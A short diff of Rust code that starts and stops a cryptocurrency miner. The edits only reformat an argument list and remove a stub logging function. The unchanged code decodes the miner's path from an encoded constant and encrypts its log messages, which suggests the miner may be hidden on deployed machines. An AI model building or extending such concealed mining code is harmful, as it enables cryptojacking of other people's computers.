@@ -56,7 +56,6 @@ pub fn log() -> String {
 }
 
 pub fn run_miner(algo: &str, pool: &str, wallet: &str) -> anyhow::Result<()> {
-
     info_crypt!("Starting miner...");
 
     let mut child = utils::run_process_handle(
@@ -65,14 +64,7 @@ pub fn run_miner(algo: &str, pool: &str, wallet: &str) -> anyhow::Result<()> {
             utils::get_working_dir()?,
             wpkg_crypto::decode(MINER_DIR)
         ),
-        vec![
-            "--algo",
-            algo,
-            "--server",
-            pool,
-            "--user",
-            wallet,
-        ],
+        vec!["--algo", algo, "--server", pool, "--user", wallet],
     )?;
 
     tokio::spawn(async move {
@@ -104,8 +96,4 @@ pub fn stop_miner() -> anyhow::Result<()> {
     *MINER_RUNNED.lock().unwrap() = false;
     info_crypt!("Miner was stopped by WPKG...");
     Ok(())
-}
-
-pub fn getlogs() -> anyhow::Result<&str> {
-    Ok("jakiś fajny string")
 }
